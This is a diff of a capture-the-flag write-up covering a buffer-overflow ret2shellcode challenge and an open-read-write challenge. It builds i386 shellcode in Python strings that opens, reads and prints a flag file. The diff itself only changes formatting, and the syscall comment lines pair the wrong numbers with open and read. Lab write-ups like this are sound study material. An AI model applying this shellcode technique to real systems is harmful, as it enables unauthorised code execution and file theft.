@@ -3,10 +3,10 @@
 ## 01 start
 checksec, RWX segment existed. maybe shellcode can be used.
 
-a ASM program, calling some sys\_call, like `sys\_write`/'sys\_read`.
+a ASM program, calling some sys_call, like `sys_write`/'sys_read`.
 and reading process is a BOF vulnerability, length of buffer is enough for a simple ROP.
 
-hijack the second argu of `sys\_write` to print out the stack info, then ret2shellcode.
+hijack the second argu of `sys_write` to print out the stack info, then ret2shellcode.
 
 ```py
 #!/bin/python3
@@ -48,10 +48,10 @@ we can not launch a shell directly, but these three calls are enough to read a f
 
 we will open the flag and read it to buffer, and write it to stdout.
 
-man syscalls and `/usr/include/x86\_64-linux-gnu/asm/unistd\_32.h`:
+man syscalls and `/usr/include/x86_64-linux-gnu/asm/unistd_32.h`:
 ```
-int open(const char *pathname, int flags);				#define __NR_read 3
-ssize_t read(int fd, void *buf, size_t count);			#define __NR_open 5
+int open(const char *pathname, int flags);		#define __NR_read 3
+ssize_t read(int fd, void *buf, size_t count);		#define __NR_open 5
 ssize_t write(int fd, const void *buf, size_t count);	#define __NR_write 4
 
 path is `/home/orw/flag`, 14 bytes.
@@ -79,13 +79,14 @@ path is `/home/orw/flag`, 14 bytes.
 	- crafting:
 		- push '/home/orw/flag\x00'
 		```
-esp->	'///h'
+		'///h' <-esp
 		'ome/'
 		'orw/'
 		'flag'
 		'\x00'
 		```
 		crafting the asm code:
+		
 		```py
 		shellcode = ''
 		shellcode += 'xor eax, eax\n push eax\n'
@@ -102,20 +103,24 @@ esp->	'///h'
 		temp = hex(u32(b'///h'))
 		shellcode += 'push '+ temp + '\n'
 		```
+
 		- call open('esp')
 			eax: 5
 			ebx: buf(esp)
 			call
+		
 		```py
 		shellcode += 'push 0x5\n pop eax\n'
 		shellcode += 'mov ebx, esp\n'
 		shellcode += 'int 0x80\n'
 		```
+		
 		- call read('eax', 'esp', 0x50)
 			eax: 3
 			ebx: eax(fd)
 			ecx: esp(buf)
 			edx: 0x50(len)
+		
 		```py
 		shellcode += 'mov ebx, eax\n'
 		shellcode += 'push 0x3\n pop eax\n'
